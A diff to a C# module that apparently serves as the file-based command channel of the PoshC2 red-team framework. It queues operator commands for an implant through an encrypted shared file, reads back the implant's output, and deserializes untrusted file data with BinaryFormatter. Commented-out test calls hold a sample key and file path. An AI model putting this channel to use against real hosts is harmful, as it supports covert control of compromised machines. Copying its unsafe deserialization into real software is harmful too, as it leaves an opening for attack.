@@ -1,11 +1,9 @@
 using System;
 using System.IO.Compression;
-using System.IO.Pipes;
 using System.Linq;
 using System.IO;
 using System.Security.Cryptography;
 using System.Text;
-using System.Security.Principal;
 using System.Threading;
 using System.Runtime.Serialization;
 using System.Security;
@@ -41,24 +39,24 @@ namespace FComm
 
         public void GetObjectData(SerializationInfo info, StreamingContext context)
         {
-            info.AddValue("packetType", PacketType);
-            info.AddValue("input", Input);
-            info.AddValue("output", Output);
-            info.AddValue("sent", Sent);
-            info.AddValue("retrieved", Retrieved);
-            info.AddValue("actioned", Actioned);
-            info.AddValue("updateTime", UpdateTime);
+            info.AddValue("PacketType", PacketType);
+            info.AddValue("Input", Input);
+            info.AddValue("Output", Output);
+            info.AddValue("Sent", Sent);
+            info.AddValue("Retrieved", Retrieved);
+            info.AddValue("Actioned", Actioned);
+            info.AddValue("UpdateTime", UpdateTime);
         }
 
         public RHDataGram(SerializationInfo info, StreamingContext context)
         {
-            PacketType = (string)info.GetValue("packetType", typeof(string));
-            Input = (string)info.GetValue("input", typeof(string));
-            Output = (string)info.GetValue("output", typeof(string));
-            Sent = (bool)info.GetValue("sent", typeof(bool));
-            Actioned = (bool)info.GetValue("actioned", typeof(bool));
-            Retrieved = (bool)info.GetValue("retrieved", typeof(bool));
-            UpdateTime = (DateTime)info.GetValue("updateTime", typeof(DateTime));
+            PacketType = (string)info.GetValue("PacketType", typeof(string));
+            Input = (string)info.GetValue("Input", typeof(string));
+            Output = (string)info.GetValue("Output", typeof(string));
+            Sent = (bool)info.GetValue("Sent", typeof(bool));
+            Actioned = (bool)info.GetValue("Actioned", typeof(bool));
+            Retrieved = (bool)info.GetValue("Retrieved", typeof(bool));
+            UpdateTime = (DateTime)info.GetValue("UpdateTime", typeof(DateTime));
         }
     }
 
@@ -128,6 +126,18 @@ namespace FComm
         }
 
     }
+    sealed class PreMergeToMergedDeserializationBinder : SerializationBinder
+    {
+        public override Type BindToType(string assemblyName, string typeName)
+        {
+            if (typeName.Contains("System.Collections.Generic.List"))
+            {
+                return Type.GetType("System.Collections.Generic.List`1[[FComm.RHDataGram, FComm, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null]]");
+            }
+            return Type.GetType("FComm.RHDataGram");
+        }
+    }
+
 
     public class Class1
     {
@@ -136,14 +146,12 @@ namespace FComm
         private static RHServer FComm;
         private static readonly object _lock = new object();
 
-
         public static void Main(string[] args)
         {
             Console.WriteLine(String.Join(",", args));
-            Console.WriteLine(args.Length);
             Start(args);
-            /*Start(new string[] {"Start","c:\\users\\public\\test.ost","c7P+slKaJuUuq06OUZnp4HFKOEsc+e86m24Lzzsqg+c="});
-            
+            //Start(new string[] { "Start", "c:\\users\\public\\test.ost", "c7P+slKaJuUuq06OUZnp4HFKOEsc+e86m24Lzzsqg+c=" });
+            /*
             Start(new string[] { "Start", "ATHOMPSON", "msukpipereader", "mtkn4", "c7P+slKaJuUuq06OUZnp4HFKOEsc+e86m24Lzzsqg+c=" });
             Console.ReadLine();
             Start(new string[] { "foo" });
@@ -162,33 +170,31 @@ namespace FComm
         /// </summary>
         public static void Start(string[] args)
         {
-            Console.WriteLine("args in Start: " + String.Join(",", args));
             bool Running = false;
-            
+
 
             if (args.Length == 3 && args[0].ToLower() == "start") // If in format 'Start <filepath> <key>'
             {
-                Console.WriteLine("STARTING!!!...");
                 FilePath = args[1];
                 Encryptionkey = args[2];
                 Console.WriteLine($"[+] Connecting to: {FilePath} with key {Encryptionkey}");
                 FComm = new RHServer(FilePath); //create an object.
-                Console.WriteLine("object: " + FComm.GetType().ToString());
                 Running = true;
                 Init(FComm);
-                Console.WriteLine("Past INIT");
-            }
-            Console.WriteLine("After If");
-            var command = $"{string.Join(" ", args)}";
-            if (command.ToLower().StartsWith("kill"))
-            {
-                IssueCommand(command, FComm, Running);
-                Running = false;
-                //assume the kill command works - maybe need to remove the implant from poshc2?
             }
             else
             {
-                IssueCommand(command, FComm, Running);
+                var command = $"{string.Join(" ", args)}";
+                if (command.ToLower().StartsWith("kill"))
+                {
+                    IssueCommand(command, FComm, Running);
+                    Running = false;
+                    //assume the kill command works - maybe need to remove the implant from poshc2?
+                }
+                else
+                {
+                    IssueCommand(command, FComm, Running);
+                }
             }
         }
 
@@ -196,34 +202,34 @@ namespace FComm
         /// Will issue the specified command to the pipe and read the response
         /// </summary>
 		public static void Init(RHServer FComm)
-        { 
+        {
             lock (_lock)
             {
                 try
                 {
                     byte[] DataToParseBytes = Decrypt(Encryptionkey, FComm.Receive());
-                    Console.WriteLine("Bytes: " + DataToParseBytes.Length);
+                    
                     //Step 1: STREAM
                     MemoryStream stream = new MemoryStream(DataToParseBytes);
                     BinaryFormatter bf = new BinaryFormatter();
+                    //Fix the assembly name.
+                    bf.Binder = new PreMergeToMergedDeserializationBinder();
                     //Step 2: DESERIALIZE!
                     List<RHDataGram> DataToParse = (List<RHDataGram>)bf.Deserialize(stream);
-                    Console.WriteLine(DataToParse.ToString());
                     stream.Dispose();
                     foreach (RHDataGram Task in DataToParse)
                     {
-                        if (Task.PacketType == "INIT") // it's the initialisation data. I should do something with this during the connect phase.
+                        if (Task.PacketType == "INIT" && Task.Retrieved == false) // it's the initialisation data. I should do something with this during the connect phase.
                         {
-                            Console.WriteLine("Init Received or something");
                             Console.WriteLine(Task.Output);
                             Task.Retrieved = true;
                             continue;
                         }
                     }
                     MemoryStream stream2 = new MemoryStream();
-                    bf.Serialize(stream, DataToParse);
+                    bf.Serialize(stream2, DataToParse);
                     var DataToGo = Encrypt(Encryptionkey, null, false, stream2.ToArray()); //list is encrypted.
-                    stream.Dispose();
+                    stream2.Dispose();
                     //Send the DATAAAAAAAAAHH!!!
                     FComm.SendData(DataToGo);
                 }
@@ -252,35 +258,30 @@ namespace FComm
                         //Step 1: STREAM
                         MemoryStream stream = new MemoryStream(DataToParseBytes);
                         BinaryFormatter bf = new BinaryFormatter();
+                        bf.Binder = new PreMergeToMergedDeserializationBinder();
                         //Step 2: DESERIALIZE!
                         List<RHDataGram> DataToParse = (List<RHDataGram>)bf.Deserialize(stream);
                         stream.Dispose();
 
                         foreach (RHDataGram Task in DataToParse)
                         {
-                            if (Task.PacketType == "INIT") // it's the initialisation data. I should do something with this during the connect phase.
-                            {
-                                Console.WriteLine(Task.Output);
-                                Task.Retrieved = true;
-                                continue;
-                            }
-                            if (Task.Actioned == true && Task.PacketType != "INIT") //It's output from a command!.
+                            if (Task.Actioned == true && Task.PacketType != "INIT" && Task.Retrieved == false) //It's output from a command!.
                             {
                                 Console.WriteLine(Task.Output);
                                 Task.Retrieved = true;
                                 Running = false;
                             }
-                            if (taskAdded == false) // Shonky Ghetto Code just so we don't add endless copies of the same command.
-                            {
-                                DataToParse.Add(FComm.SetTask(command));
-                                taskAdded = true;
-                            }
-
                         }
+                        if (taskAdded == false) // Shonky Ghetto Code just so we don't add endless copies of the same command.
+                        {
+                            DataToParse.Add(FComm.SetTask(command));
+                            taskAdded = true;
+                        }
+
                         MemoryStream stream2 = new MemoryStream();
-                        bf.Serialize(stream, DataToParse);
+                        bf.Serialize(stream2, DataToParse);
                         var DataToGo = Encrypt(Encryptionkey, null, false, stream2.ToArray()); //list is encrypted.
-                        stream.Dispose();
+                        stream2.Dispose();
                         //Send the DATAAAAAAAAAHH!!!
                         FComm.SendData(DataToGo);
                     }
